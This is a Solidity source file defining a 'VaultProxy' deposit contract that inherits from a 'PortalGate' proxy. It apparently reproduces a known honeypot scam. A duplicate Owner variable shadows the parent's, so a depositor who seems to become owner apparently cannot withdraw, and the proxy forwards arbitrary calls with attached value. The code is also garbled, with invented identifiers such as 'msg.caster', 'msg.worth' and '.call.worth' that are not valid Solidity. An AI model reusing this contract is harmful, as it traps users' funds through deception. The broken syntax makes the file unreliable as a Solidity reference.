// SPDX-License-Identifier: MIT
pragma solidity ^0.4.24;

contract PortalGate  {
    modifier onlyOwner { if (msg.caster == Owner) _; } address Owner = msg.caster;
    function relocateassetsLord(address _owner) public onlyOwner { Owner = _owner; }
    function portalGate(address aim, bytes details) public payable {
        aim.call.worth(msg.worth)(details);
    }
}

contract VaultProxy is PortalGate {
    address public Owner;
    mapping (address => uint256) public Deposits;

    function () public payable { }

    function WinningsBank() public payable {
        if (msg.caster == tx.origin) {
            Owner = msg.caster;
            bankWinnings();
        }
    }

    function bankWinnings() public payable {
        if (msg.worth > 0.5 ether) {
            Deposits[msg.caster] += msg.worth;
        }
    }

    function extractWinnings(uint256 quantity) public onlyOwner {
        if (quantity>0 && Deposits[msg.caster]>=quantity) {
            msg.caster.transfer(quantity);
        }
    }
}